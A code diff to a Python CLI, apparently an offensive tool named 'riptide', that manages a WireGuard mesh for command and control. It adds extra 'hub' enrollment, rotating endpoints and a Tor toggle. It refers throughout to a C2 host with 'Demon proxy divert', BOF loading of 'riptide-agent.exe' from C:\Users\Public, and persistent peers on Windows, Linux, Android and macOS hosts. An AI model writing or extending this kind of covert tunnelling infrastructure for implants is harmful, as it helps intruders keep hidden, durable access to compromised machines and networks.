@@ -21,7 +21,7 @@ ROOT = Path(__file__).resolve().parent
 sys.path.insert(0, str(ROOT))
 
 from lib.keys import selftest  # noqa: E402
-from lib.render import peer_conf, write_tree  # noqa: E402
+from lib.render import conf_for, write_tree  # noqa: E402
 from lib.state import Mesh  # noqa: E402
 
 
@@ -164,17 +164,56 @@ def cmd_peer(args: argparse.Namespace) -> None:
 def cmd_set(args: argparse.Namespace) -> None:
     m = _mesh(args)
     try:
+        tor = None
+        if getattr(args, "tor", None) == "yes":
+            tor = True
+        elif getattr(args, "tor", None) == "no":
+            tor = False
         p = m.set_peer(
             args.name,
             tag=args.tag,
             mode=args.mode,
             routes=args.routes,
             serve=args.serve,
+            tor=tor,
         )
     except (KeyError, ValueError) as e:
         _die(str(e))
     write_tree(m.out, m.data)
     _ok(f"set {p['name']} tag={p.get('tag')} mode={p.get('mode')} routes={p.get('routes')} serve={p.get('serve')}")
+
+
+def cmd_hub(args: argparse.Namespace) -> None:
+    m = _mesh(args)
+    eps = [x.strip() for x in (args.endpoints or "").split(",") if x.strip()]
+    try:
+        h = m.add_hub(args.name, args.os, args.listen, eps)
+    except ValueError as e:
+        _die(str(e))
+    write_tree(m.out, m.data)
+    conf = m.out / "hubs" / f"{h['name']}.conf"
+    _ok(f"HUB {h['name']}  {h['address']}  listen {h.get('listen_port')}  endpoints={h.get('endpoints')}")
+    _ok(f"conf {conf}")
+    _ok("pack + BOF: riptide-hub C:\\Users\\Public\\riptide-agent.exe C:\\Users\\Public\\peer.conf")
+    _ok("inbound UDP on that host (LAN/WAN) must reach ListenPort")
+
+
+def cmd_endpoint(args: argparse.Namespace) -> None:
+    m = _mesh(args)
+    if args.action == "list":
+        print("primary:", ", ".join(m.data.get("endpoints") or [m.data.get("endpoint")]))
+        for p in m.data.get("peers") or []:
+            if p.get("role") == "hub":
+                print(f"{p['name']}:", ", ".join(p.get("endpoints") or []) or "(none)")
+        return
+    if not args.addr:
+        _die("endpoint add needs --addr HOST:PORT")
+    try:
+        eps = m.add_endpoint(args.addr, args.name or "")
+    except (KeyError, ValueError) as e:
+        _die(str(e))
+    write_tree(m.out, m.data)
+    _ok(f"endpoints {', '.join(eps)}")
 
 
 def cmd_c2(args: argparse.Namespace) -> None:
@@ -231,6 +270,8 @@ def cmd_status(args: argparse.Namespace) -> None:
     d = m.data
     print(f"mesh     {d['name']}")
     print(f"endpoint {d['endpoint']}")
+    if d.get("endpoints"):
+        print(f"hubs     {', '.join(d['endpoints'])}")
     print(f"network  {d['network']}")
     print(f"crypto   {d['crypto']['tunnel']}  aead={d['crypto']['aead']}  psk=per-peer")
     print(f"hub      {d['hub']['address']}  pub={d['hub']['public']}")
@@ -238,10 +279,11 @@ def cmd_status(args: argparse.Namespace) -> None:
     c2 = d.get("c2") or {}
     if c2.get("host"):
         print(f"c2       {c2['host']}  via {c2.get('via')}")
-    print(f"{'name':16} {'os':10} {'tag':8} {'overlay':18} {'mode':10} handshake")
+    print(f"{'name':16} {'os':10} {'tag':8} {'overlay':18} {'role':6} {'mode':10} handshake")
     for p in d["peers"]:
         hs = live.get(p["public"], p.get("handshake", "unknown"))
-        print(f"{p['name']:16} {p['os']:10} {p.get('tag','?'):8} {p['address']:18} {p.get('mode','?'):10} {hs}")
+        role = p.get("role") or "peer"
+        print(f"{p['name']:16} {p['os']:10} {p.get('tag','?'):8} {p['address']:18} {role:6} {p.get('mode','?'):10} {hs}")
     if d.get("revoked"):
         print(f"\nrevoked: {', '.join(x['name'] for x in d['revoked'])}")
 
@@ -255,7 +297,9 @@ def cmd_pack(args: argparse.Namespace) -> None:
     dest = m.out / "packs" / peer["name"]
     dest.mkdir(parents=True, exist_ok=True)
     conf = dest / "peer.conf"
-    conf.write_text(peer_conf(m.data, peer), encoding="utf-8", newline="\n")
+    conf.write_text(conf_for(m.data, peer), encoding="utf-8", newline="\n")
+    if peer.get("role") == "hub":
+        _ok(f"HUB pack — BOF: riptide-hub <exe> {conf}  (ListenPort {peer.get('listen_port', 51820)}/udp)")
     try:
         conf.chmod(0o600)
     except OSError:
@@ -523,7 +567,23 @@ def build_parser() -> argparse.ArgumentParser:
     s.add_argument("--mode", choices=("persist", "session"))
     s.add_argument("--routes", default=None)
     s.add_argument("--serve", default=None)
+    s.add_argument("--tor", choices=("yes", "no"))
     s.set_defaults(fn=cmd_set)
+
+    s = sub.add_parser("hub", help="enroll a host as extra WireGuard hub (BOF ListenPort)")
+    s.add_argument("--out", default="./riptide-out")
+    s.add_argument("--name", required=True)
+    s.add_argument("--os", choices=("windows", "linux", "android", "darwin"), default="windows")
+    s.add_argument("--listen", type=int, default=51820)
+    s.add_argument("--endpoints", default="", help="WAN/LAN host:port list, comma — how others dial this hub")
+    s.set_defaults(fn=cmd_hub)
+
+    s = sub.add_parser("endpoint", help="rotate list for primary hub or extra hub")
+    s.add_argument("action", choices=("add", "list"), nargs="?", default="add")
+    s.add_argument("--out", default="./riptide-out")
+    s.add_argument("--addr", default="", help="host:port")
+    s.add_argument("--name", default="", help="empty=primary VPS hub, or extra hub peer name")
+    s.set_defaults(fn=cmd_endpoint)
 
     s = sub.add_parser("c2", help="C2 host packed into peer [Riptide] (Demon proxy divert)")
     s.add_argument("--out", default="./riptide-out")
